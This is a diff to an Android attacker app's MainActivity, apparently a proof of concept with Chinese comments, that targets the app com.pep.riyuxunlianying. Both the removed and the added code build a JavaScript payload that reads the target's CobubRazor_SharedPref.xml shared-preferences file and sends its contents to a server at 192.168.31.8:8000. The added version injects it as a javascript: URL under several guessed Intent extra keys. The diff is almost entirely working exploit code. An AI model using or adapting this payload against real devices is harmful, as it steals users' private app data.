@@ -34,29 +34,27 @@ public class MainActivity extends Activity {
             intent.setComponent(target);
             
             // 构造恶意 Payload (XSS -> File Theft)
-            // 将 <YOUR_PC_IP> 替换为你的服务器 IP
-            String maliciousJs = "<script>" +
-                    "var request = new XMLHttpRequest();" +
-                    "var file_path = 'file:///data/data/com.pep.riyuxunlianying/shared_prefs/CobubRazor_SharedPref.xml';" +
-                    "request.open('GET', file_path, false);" +
-                    "request.send(null);" +
-                    "var result = request.responseText;" +
-                    "var exfiltrate = new XMLHttpRequest();" +
-                    "exfiltrate.open('GET', 'http://192.168.31.8:8000/steal?data=' + encodeURIComponent(result), false);" +
-                    "exfiltrate.send(null);" +
-                    "</script>";
+            // 使用 javascript: 伪协议，因为 WebView.loadUrl() 通常不直接接受 HTML 字符串
+            // 压缩 JS 代码以避免换行问题
+            String jsCode = "var xhr=new XMLHttpRequest();" +
+                            "xhr.open('GET','file:///data/data/com.pep.riyuxunlianying/shared_prefs/CobubRazor_SharedPref.xml',false);" +
+                            "xhr.send(null);" +
+                            "new Image().src='http://192.168.31.8:8000/?data='+encodeURIComponent(xhr.responseText);";
+            
+            String payload = "javascript:" + jsCode;
 
             // 模拟 SessionKewen 对象结构
-            // 注意：这需要攻击者在自己的 App 中定义与目标 App 相同的包名和类名的 Parcelable 对象，
-            // 或者使用反射/动态代理来构造 Intent。
-            // 为了简化 PoC，这里假设我们可以通过 "extra_session_kewen" (猜测的 key) 传递数据
-            // 在实际攻击中，需要反编译目标 App 获取准确的 Parcelable 定义。
+            // 尝试多种常见的 Intent Extra Key，以防猜错
+            intent.putExtra("url", payload);
+            intent.putExtra("target_url", payload);
+            intent.putExtra("web_url", payload);
+            intent.putExtra("link", payload);
+            intent.putExtra("data", payload);
+            intent.putExtra("contents", payload); // 保留之前的 key
             
-            // 尝试直接传递 HTML 字符串 (如果目标有逻辑处理 String extra)
-            intent.putExtra("contents", maliciousJs);
-            intent.putExtra("url", maliciousJs);
-            
-            // 如果必须传递复杂对象，代码会非常复杂，通常需要构建一个包含相同类定义的 APK。
+            // 如果目标 Activity 只是简单的 loadUrl(intent.getStringExtra("..."))
+            // 那么 javascript: 协议将会在当前 WebView 上下文中执行 JS。
+            // 如果 WebView 开启了 allowUniversalAccessFromFileURLs，我们就能读取本地文件。
             
             startActivity(intent);
             Log.d("Attacker", "Attack Intent sent!");
